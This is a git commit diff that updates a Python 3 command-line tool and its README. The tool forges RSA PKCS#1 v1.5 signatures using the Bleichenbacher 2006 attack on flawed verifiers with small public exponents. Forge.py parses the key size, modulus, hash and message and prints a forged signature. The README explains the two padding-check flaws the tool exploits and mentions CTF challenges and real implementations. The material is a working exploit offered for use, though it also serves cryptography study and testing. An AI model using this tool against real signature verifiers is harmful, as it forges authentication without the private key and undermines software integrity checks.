a09e945f42352a5fbcc5f641729d9bf823979a83
Maxim Masiutin <maxim@masiutin.com>
2021-05-05 19:16:58 +0300

    Version 2.0

--- Forge.py
+++ Forge.py
@@ -1,49 +1,197 @@
 #!/usr/bin/python
 
+# This file is part of Bleichenbacher Signature Forger v2.0.
+
+# Copyright 2016 Filippo Valsorda
+# Copyright 2017 Peter Hoeg Steffensen
+# Copyright 2021 Maxim Masiutin
+
+# History:
+
+# 1.0 (July 2nd, 2017)
+#   - Initial version
+
+# 2.0 (May 5th, 2021)
+#   - Ported to Python 3. Removed strings in favor of byte objects
+#   - Added support for output formats
+#   - Added support for modulus and public exponent command line parameters. The modulus can be specified instead of the key size
+#   - Dynamic precision adjustment for larger numbers
+#   - The program exits with an appropriate message if it cannot generate a signature, rather than spinning in an endless loop
+#   - The option to specify the number of FF's
+#   - The "quiet" option
+#   - All error messages are printed to stderr
+
+
+# Bleichenbacher Signature Forger is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+
+# Bleichenbacher Signature Forger is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+
+# You should have received a copy of the GNU General Public License
+# along with Bleichenbacher Signature Forger.  If not, see <https://www.gnu.org/licenses/>.
+
+
 import argparse
+import sys
 
-from HashInfo import *
-from SignatureForger import *
+from HashInfo import HASH_ASN1
+from SignatureForger import SignatureForger, toInt
 
-def printOutput(signature):
-  print("****************************************************")
-  print("*         Signature successfully generated!        *")
-  print("****************************************************")
-  print("")
-  print("Signature:")
-  print(hex(signature))
-  print("Plaintext:")
-  print(hex(toInt(signature) ** 3))
+DefaultPublicExponent = 3
+DefaultFFcount = 1
+DefaultQuiet = False
+
+
+def printOutput(arg_signature, arg_format, arg_quiet):
+
+    if not arg_quiet:
+        print("****************************************************")
+        print("*         Signature successfully generated!        *")
+        print("****************************************************")
+        print("")
+        print("Signature:")
+
+    binary_data = None
+    if arg_format == "base64":
+        import base64
+
+        binary_data = base64.b64encode(arg_signature)
+    elif arg_format == "hex":
+        import binascii
+
+        binary_data = binascii.hexlify(arg_signature)
+    elif arg_format == "raw":
+        sys.stdout.buffer.write(arg_signature)
+    elif arg_format == "decimal":
+        print(toInt(arg_signature))
+    else:
+        print("Unknown output format specified " + arg_format, file=sys.stderr)
+
+    if binary_data is not None:
+        print(binary_data.decode("ascii"))
 
 
 def getArguments():
-  parser = argparse.ArgumentParser(description="Signature forger for RSA PKCS1v1.5 given that the exponent 3 is used and the verification algorithm is not implemented properly")
+    parser = argparse.ArgumentParser(
+        description="Bleichenbacher Signature Forger. "
+        + "Version 2.0. "
+        + "This program demonstrates the vulenrability of the RSA PKCS1v1.5 and the attack when public exponent is small (e.g., 3) and the verification algorithm is not implemented properly."
+    )
 
-  parser.add_argument("-k", "--keysize", type=int)
-  parser.add_argument("-ha", "--hashalg", action="store", type=str, choices=list(HASH_ASN1.keys()))
-  parser.add_argument("-va", "--variant", type=int, choices=[1,2])
-  parser.add_argument("-of", "--outputformat", type=str, choices=["hex", "base64", "raw"])
-  parser.add_argument("-m", "--message", type=str)
+    parser.add_argument("-k", "--keysize", type=int)
+    parser.add_argument(
+        "-ha", "--hashalg", action="store", type=str, choices=list(HASH_ASN1.keys())
+    )
+    parser.add_argument(
+        "-va",
+        "--variant",
+        type=int,
+        choices=[1, 2],
+        help="1 - 00 01 FF ... 00 ASN.1 HASH ZeroGarbage;  2 - 00 01 FF RandomNonzeroGarbage 00 ASN.1 HASH",
+    )
+    parser.add_argument(
+        "-of", "--outputformat", type=str, choices=["decimal", "hex", "base64", "raw"]
+    )
+    parser.add_argument("-m", "--message", type=str)
+    parser.add_argument(
+        "-e", "--public-exponent", type=int, default=DefaultPublicExponent
+    )
+    parser.add_argument("-N", "--modulus", type=int)
+    parser.add_argument("-F", "--ffcount", type=int, default=DefaultFFcount)
+    parser.add_argument("-q", "--quiet", action="store_true")
 
-  args = parser.parse_args()
-  return args
+    ret_args = parser.parse_args()
 
-if __name__ == "__main__":
+    if len(sys.argv) == 1:
+        parser.print_help(sys.stderr)
+        sys.exit(1)
 
-  args = getArguments()
+    return ret_args
 
-  keySize = args.keysize
-  hashAlg = args.hashalg
 
-  signatureForger = SignatureForger(keySize, hashAlg)
+args = getArguments()
 
-  signature = ""
+quiet = args.quiet
 
-  if args.variant == 1:
-    signature = signatureForger.forgeSignature_method1(args.message)
-  elif args.variant == 2:
-    signature = signatureForger.forgeSignature_method2(args.message)
-  else:
-    raise Exception("Unsupported signature method") 
+if quiet is None:
+    quiet = DefaultQuiet
 
-  printOutput(signature)
+keySize = args.keysize
+hashAlg = args.hashalg
+ffcount = args.ffcount
+if ffcount is None:
+    ffcount = DefaultFFcount
+
+public_exponent = args.public_exponent
+if public_exponent is None:
+    public_exponent = DefaultPublicExponent
+
+modulus = args.modulus
+
+if (modulus is not None) and (keySize is not None):
+    modulus_bits = modulus.bit_length()
+    if modulus_bits > keySize:
+        print(
+            "You have specified modulus of",
+            modulus_bits,
+            "bits and the key size of",
+            keySize,
+            "bits which is smaller!",
+            file=sys.stderr,
+        )
+        sys.exit(1)
+
+    dif = keySize - modulus_bits
+    if dif > 16:
+        print(
+            "You have specified modulus of",
+            modulus_bits,
+            "bits and the key size of",
+            keySize,
+            "bits. Therefore, the modulus is",
+            dif,
+            "bits smaller than the key size, while the maximum tolerable difference is 16 bits",
+            file=sys.stderr,
+        )
+        sys.exit(1)
+
+if (modulus is not None) and (keySize is None):
+    keySize = modulus.bit_length()
+
+if public_exponent is None:
+    public_exponent = DefaultPublicExponent
+
+if keySize is None:
+    print("Please specify the key size and/or the modulus", file=sys.stderr)
+    sys.exit(1)
+
+signatureForger = SignatureForger(
+    keySize, hashAlg, modulus, public_exponent, ffcount, quiet
+)
+
+signature = None
+
+if args.variant == 1:
+    signature = signatureForger.forgeSignature_method_garbage_end(args.message)
+elif args.variant == 2:
+    signature = signatureForger.forgeSignature_method_garbage_mid(args.message)
+else:
+    print("Unsupported signature method", file=sys.stderr)
+    sys.exit(1)
+
+of = args.outputformat
+if of is None:
+    of = "base64"
+if signature is None:
+    print("Cannot generate the signature.", end="", file=sys.stderr)
+    if (public_exponent <= 3) and (keySize < 4096):
+        print(" (Key size is too small?)", end="", file=sys.stderr)
+    print("", file=sys.stderr)
+    sys.exit(2)
+else:
+    printOutput(signature, of, quiet)
--- README.md
+++ README.md
@@ -1,41 +1,62 @@
-# BleichenbacherSignatureForger
-Forge PKCS1v1.5 signature for questionable implementation of verification algorithms...
+# Bleichenbacher BB'06 RSA Signature Tool
 
 Intro
 -----
 
-This repository contains a Python 2 implementation of the Bleichenbacher signature forgery attack. Having seen this variant of the attack multiple times during the last year both in CTFs and in real implementations showed the need for a more general solution than the hacky frankenstein scripts I have laying around.
+This repository contains a Python 3 implementation of the Bleichenbacher signature forgery attack, described in 2006 (BB'06 attack). Having seen this variant of the attack multiple times during the last year both in CTFs and in real implementations showed the need for a more general solution than the hacky frankenstein scripts, Peter Hoeg Steffensen have laying around. Maxim Masiutin has updated this tool to solve a challenge published in 2020 on an Information Security learning platform, to generate a signature for a key of 2736 bits (e=3) without having the private key.
 
 Attack
 ------
 
-PKCS1v15 is defined in https://www.ietf.org/rfc/rfc3447.txt. If the verification algorithm is trying to parse the result of the public key operation instead of building the expected data and comparing it to the result of the public key operation there is a possibility that it might be vulnerable to this attack.
+PKCS1v15 is defined in <https://www.ietf.org/rfc/rfc3447.txt>. If the verification algorithm is trying to parse the result of the public key operation instead of building the expected data and comparing it to the result of the public key operation there is a possibility that it might be vulnerable to this attack.
 
 Two variants of the attack is supported:
-1. The length is not checked and a the padding is on the form ``0001FFFFFFFFFFFFFFFF00 | DigestInfo | garbage``
-2. The filler (PS) is not checked - ``0001FFFFFFFFFFFFFFFF | garbage | 00 | DigestInfo``
 
-More info on variant 1. can be found at: https://www.ietf.org/mail-archive/web/openpgp/current/msg00999.html
+1. The length is not checked and a the padding is on the form ``0001FF...FF00 | DigestInfo | garbage``
+2. The filler (PS) is not checked - ``0001FF...FF | non-zero-garbage | 00 | DigestInfo``
 
-Credit for variant 2. goes to Fillipo Valsorda (https://blog.filippo.io/bleichenbacher-06-signature-forgery-in-python-rsa/)
+More info on variant 1. can be found at: <https://www.ietf.org/mail-archive/web/openpgp/current/msg00999.html>
+
+Credit for variant 2. goes to Filippo Valsorda who publihed the original version of the code in 2016 (<https://blog.filippo.io/bleichenbacher-06-signature-forgery-in-python-rsa/>)
 
 Usage
 -----
 
-```$ python Forge.py --help
-usage: Forge.py [-h] [-k KEYSIZE] [-ha {SHA-384,SHA-256,SHA-512,SHA-1,MD5}]
-                [-m MESSAGE]
+```
+$ python Forge.py --help
 
-Signature forger for RSA PKCS1v1.5 given that the exponent 3 is used and the
-verification algorithm is not implemented properly
+usage: Forge.py [-h] [-k KEYSIZE] [-ha {MD5,SHA-1,SHA-256,SHA-384,SHA-512}] [-va {1,2}] [-of {decimal,hex,base64,raw}] [-m MESSAGE] [-e PUBLIC_EXPONENT] [-N MODULUS] [-F FFCOUNT] [-q]
+
+Bleichenbacher Signature Forger. Version 2.0. This program demonstrates the vulenrability of the RSA PKCS1v1.5 and the attack when public exponent is small (e.g., 3) and the verification
+algorithm is not implemented properly.
 
 optional arguments:
   -h, --help            show this help message and exit
   -k KEYSIZE, --keysize KEYSIZE
-  -ha {SHA-384,SHA-256,SHA-512,SHA-1,MD5}, --hashalg {SHA-384,SHA-256,SHA-512,SHA-1,MD5}
+  -ha {MD5,SHA-1,SHA-256,SHA-384,SHA-512}, --hashalg {MD5,SHA-1,SHA-256,SHA-384,SHA-512}
+  -va {1,2}, --variant {1,2}
+                        1 - 00 01 FF ... 00 ASN.1 HASH ZeroGarbage; 2 - 00 01 FF RandomNonzeroGarbage 00 ASN.1 HASH
+  -of {decimal,hex,base64,raw}, --outputformat {decimal,hex,base64,raw}
   -m MESSAGE, --message MESSAGE
-  ```
+  -e PUBLIC_EXPONENT, --public-exponent PUBLIC_EXPONENT
+  -N MODULUS, --modulus MODULUS
+  -F FFCOUNT, --ffcount FFCOUNT
+  -q, --quiet
+```
 
-Will update Soon<sup>TM</sup>
+History:
 
-<sub>plz use PSS</sub>
+- 1.0 (July 2nd, 2017)
+  - Initial version
+
+- 2.0 (May 5th, 2021)
+  - Ported to Python 3
+  - Removed strings in favor of byte objects
+  - Added support for output formats
+  - Added support for modulus and public exponent command line parameters. The modulus can be specified instead of the key size
+  - Dynamic precision adjustment for larger numbers
+  - The program exits with an appropriate message if it cannot generate a signature, rather than spinning in an endless loop
+  - The option to specify the number of FF's
+  - The "quiet" option
+  - All error messages are printed to stderr
+
